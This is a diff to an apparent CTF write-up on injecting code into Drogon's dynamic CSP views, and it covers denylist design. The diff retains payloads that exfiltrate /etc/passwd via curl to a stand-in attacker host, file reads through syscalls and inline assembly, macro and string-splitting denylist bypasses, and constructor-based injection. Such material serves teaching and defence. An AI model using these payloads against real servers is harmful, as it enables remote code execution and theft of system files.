@@ -36,9 +36,9 @@ Drogon's server side rendering is handled by CSP views (C++ Server Pages). These
 
 ### Simple View Example
 
-Here's a simple example. Let's write an Example.csp:
+Here's a simple example:
 
-```cpp
+```csp {data-label=Example.csp}
 <!DOCTYPE html>
 <html>
 <body>
@@ -53,7 +53,7 @@ Here's a simple example. Let's write an Example.csp:
 
 Then render the CSP by calling `newHttpViewResponse`. We'll also pass a `name` from the URL endpoint:
 
-```cpp
+```cpp {data-label=main.cpp}
 app().registerHandler(
     "/hello/{}",
     [](const HttpRequestPtr& req, std::function<void(const HttpResponsePtr&)>&& callback, const std::string& name) {
@@ -66,7 +66,7 @@ app().registerHandler(
 
 After starting the server, we can run `curl 127.0.0.1:8080/hello/Picard` and observe the following HTML:
 
-```html
+```html {data-label=127.0.0.1:8080/hello/Picard}
 <!DOCTYPE html>
 <html>
 <body>
@@ -120,21 +120,19 @@ All of this happens in [SharedLibManager.cc](https://github.com/drogonframework/
 Another natural question to ask is: how is CSP markup converted in C++ source code and compiled?
 
 This is quite an important question, since it affects how we can inject code, and the defensive measures needed. We can analyse this by running...
-```text
+```sh
 drogon_ctl create view Example.csp
 ```
 which generates Example.h and Example.cc.
 
 - `<%c++ ... %>` - content inside this tag is inserted into a `genText()` function.  
-    Example.csp:
-    ```cpp
+    ```csp {data-label=Example.csp}
     <h1>Example</h1>
     <%c++ int a = 40 + 2; $$ << a; %>
     <h2>Hello world!</h2>
     ```
 
-    Example.cc:
-    ```cpp
+    ```cpp {data-label=Example.cc}
     // Boilerplate: includes...
     using namespace drogon;
     std::string Example::genText(const DrTemplateData& Example_view_data)
@@ -153,8 +151,7 @@ which generates Example.h and Example.cc.
 - {% raw %}`{% ... %}`{% endraw %} - equivalent to `<%c++ $$ << ... %>`, it just echoes the expression. The closing {% raw %}`%}`{% endraw %} must be on the same line as the opening {% raw %}`{%`{% endraw %}.
 
 - `<%inc ... %>` - meant for including additional libraries. Code is placed in file-level scope.  
-    Example.csp:
-    ```cpp
+    ```csp {data-label=Example.csp}
     <%inc
     #include <algorithm>
     #define MY_MACRO
@@ -163,8 +160,7 @@ which generates Example.h and Example.cc.
     <h1>Example</h1>
     ```
     
-    Example.cc:
-    ```cpp
+    ```cpp {data-label=Example.cc}
     // Boilerplate: includes...
     #include <algorithm>
     #define MY_MACRO
@@ -181,13 +177,11 @@ which generates Example.h and Example.cc.
     ```
 
 - `[[ ... ]]` - for inserting data passed from application code.
-    Example.csp:
-    ```cpp
+    ```csp {data-label=Example.csp}
     <h1>Hi [[name]]!</h1>
     ```
 
-    Example.cc:
-    ```cpp
+    ```cpp {data-label=Example.cc}
     // ...
     Example_tmp_stream << "<h1>Hi ";
     {
@@ -217,8 +211,7 @@ Not all of these were exploitable in my CTF chals. I selected a few vectors whic
 
 Suppose an attacker can write any CSP content in the dynamic views path. In the simplest case where filtering or checking is non-existent, the attacker can execute malicious commands using the usual `system` and `execve` functions found in libc. This allows us to exfiltrate sensitive information and launch reverse shells.
 
-Example.csp:
-```cpp
+```csp {data-label=Example.csp}
 <%c++
     system("curl http://attacker.site --data @/etc/passwd");
 %>
@@ -248,7 +241,7 @@ A sufficient denylist needs to consider the following approaches, similar to any
 
 #### File Read/Write with `fstream`, `fopen`
 
-```cpp
+```csp
 <%inc
 #include <fstream>
 #include <sstream>
@@ -267,7 +260,7 @@ A sufficient denylist needs to consider the following approaches, similar to any
 
 If high-level file IO isn't an option, we could always resort to the lower-level Linux functions.
 
-```cpp
+```csp
 <%inc
 #include <unistd.h>
 %>
@@ -282,7 +275,7 @@ If high-level file IO isn't an option, we could always resort to the lower-level
 
 We can go one level deeper using the `syscall()` function. This allows us to call the usual `open`, `read`, `write`, `execve` syscalls, albeit less readably.
 
-```cpp
+```csp
 <%inc
 #include <unistd.h>
 %>
@@ -296,7 +289,7 @@ We can go one level deeper using the `syscall()` function. This allows us to cal
 
 Thanks to syscall 59, we can also run `execve` to achieve RCE.
 
-```cpp
+```csp
 <%inc
 #include <unistd.h>
 %>
@@ -318,7 +311,7 @@ Handy Reference: [Linux x86 Syscalls - filippo.io](https://filippo.io/linux-sysc
 
 After opening and creating a file descriptor via `open` or `syscall(2, ...)`, we can also use `mmap` to perform a read instead of the usual `read`.
 
-```cpp
+```csp
 <%inc
 #include <unistd.h>
 #include <sys/mman.h>
@@ -335,7 +328,7 @@ Pretty much any syscall in C can be translated to assembly, and GCC's extended a
 
 The following CSP opens and reads `/etc/passwd` into a buffer, then outputs it. This is equivalent to the open-read idiom we used above.
 
-```cpp
+```csp
 <%c++
     char file[] = "/etc/passwd", buffer[256] = {0};
     asm(R"(
@@ -364,7 +357,7 @@ Exercises for the reader:
 - `buffer` is technically an output, so why do we treat it as an input?
 - Demonstrate RCE by using the execve syscall.
 
-Blocking the keyword `syscall` will not work here, since we can bypass it with a simple `sys" "call`… Adjacent strings are concatenated in C/C++ (`"a" "b" == "ab"`). We would need to block the functions invoking inline assembly, such as `asm`.
+Blocking the keyword `syscall` will not work here. We can bypass it with a simple `sys" "call`, since adjacent strings are concatenated in C/C++ (`"a" "b" == "ab"`). To properly block such calls, we would need to block the functions invoking inline assembly, such as `asm`.
 
 Handy Reference: [Using Inline Assembly in C/C++](https://www.codeproject.com/Articles/15971/Using-Inline-Assembly-in-C-C)
 
@@ -374,7 +367,7 @@ Handy Reference: [Using Inline Assembly in C/C++](https://www.codeproject.com/Ar
 Filters applied to a set of file extensions can be easily bypassed by uploading a file with an unfiltered extension, then `#include`-ing it in the CSP. All `#include` really does is copy-paste the included file's content, which then gets compiled as C/C++ code.
 
 - Example.csp - with stringent checks on denied words.
-    ```cpp
+    ```csp
     <%inc #include "safe.txt" %>
     ```
 
@@ -384,7 +377,7 @@ This allows us to bypass situations where, say, .csp files are strictly checked,
 
 I'll admit this one slipped my mind; quite a few players discovered this unintended solution during the CTF.
 
-#### Bypass with Macro Token Concatenation (`##`)
+#### Bypass Denylists with Macro Token Concatenation (`##`)
 
 C/C++ macros have some quirky features:
 
@@ -407,7 +400,7 @@ The second feature allows us to bypass denylists which only match full words.
 
 For instance, if a denylist blocks `system`, we can do `GLUE(s, ystem)`.
 
-```cpp
+```csp
 <%inc #define GLUE(X, Y) X ## Y %>
 <%c++
     GLUE(s, ystem)("curl http://attacker.site --data @/etc/passwd");
@@ -430,7 +423,7 @@ Let's look at a few examples of how we can achieve this tomfoolery.
 
 There are various ways to run code prior to `main()`. We can make use of the fact that `<%inc` places code in file scope.
 
-```cpp
+```csp
 <%inc
 // 1. Assign variable with function call.
 int a = system("curl http://attacker.site --data @/etc/passwd");
@@ -457,7 +450,7 @@ Blocking `<%inc` is not enough. Even with `<%c++` and `[[`, it is possible to es
 
 We demonstrate this with the following CSP:
 
-```cpp
+```csp {data-label=Example.csp}
 <%c++ 
 } 
 
@@ -475,7 +468,7 @@ std::string bar(const DrTemplateData& Example_view_data)
 
 and here's the generated C++:
 
-```cpp
+```cpp {data-label=Example.cc}
 // Boilerplate: includes...
 std::string Example::genText(const DrTemplateData& Example_view_data)
 {
@@ -496,7 +489,7 @@ std::string dummy(const DrTemplateData&)
 
 The same idea goes for variable markup `[[...]]`, the only difference being whitespace is not allowed.
 
-```cpp
+```csp
 <h1>Hi [[name"];}}__attribute__((constructor))void/**/injected(){system("...");}std::string/**/dummy(const/**/DrTemplateData&data){drogon::OStringStream/**/Example_tmp_stream;std::string/**/layoutName{""};{auto&val=data["]]</h1>
 ```
 
